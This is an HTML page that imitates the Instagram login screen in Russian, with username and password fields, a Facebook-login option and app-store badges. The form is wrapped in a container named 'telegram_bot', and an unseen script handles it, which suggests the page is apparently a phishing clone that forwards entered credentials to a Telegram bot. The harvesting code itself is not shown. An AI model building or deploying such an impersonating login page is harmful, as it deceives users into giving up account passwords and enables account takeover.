<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>Instagram</title>
	<!-- google fonts -->
	<link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
	<!-- font awesome -->
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"
		integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
	<!-- style css -->
	<link rel="stylesheet" href="style/style.css">
	<link rel="shortcut icon" href="./instagram-logo.png" type="image/x-icon">
</head>

<body>



	<main class="instagram">
		<a href="#!" class="logo-img"><img src="./img/instagram img.png" alt="Instagram image" width="175px"></a>
		<div id="telegram_bot">
			<form>
				<input type="text" class="login" placeholder="Телефон, имя пользователя или эл. адрес">
				<input type="password" class="password" placeholder="Пароль">
				<span class="icon" onclick="inputType()">
					<span id="hide-one"> Скрыть</span>
					<span id="hide-two">Показать</span>
				</span>
				<button type="submit" class="submit">Войти</button>
			</form>
		</div>
		<p class="ili">ИЛИ</p>
		<p class="facebook">
			<i class="fa-brands fa-facebook-square"></i>
			Войти через Facebook
		</p>
		<p class="password-zab">Забыли пароль?</p>
		<p class="question">У вас ещё нет аккаунта? <a href="#!" class="register">Зарегистрироваться</a></p>
		<p class="download-app">Установите приложение.</p>
		<div class="instagram-img">
			<img src="./img/apple-instagram.png" alt="Instagram download for instagram img" width="140px">
			<img src="./img/playmarket-instagram.png" alt="Play Market download for instagram img" width="140px">
		</div>
	</main>






	<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/js/all.min.js"
		integrity="sha512-6PM0qYu5KExuNcKt5bURAoT6KCThUmHRewN3zUFNaoI6Di7XJPTMoT6K0nsagZKk2OB4L7E3q1uQKHNHd4stIQ=="
		crossorigin="anonymous" referrerpolicy="no-referrer"></script>
	<script src="js/script.js" type="text/javascript" defer></script>

</body>

</html>
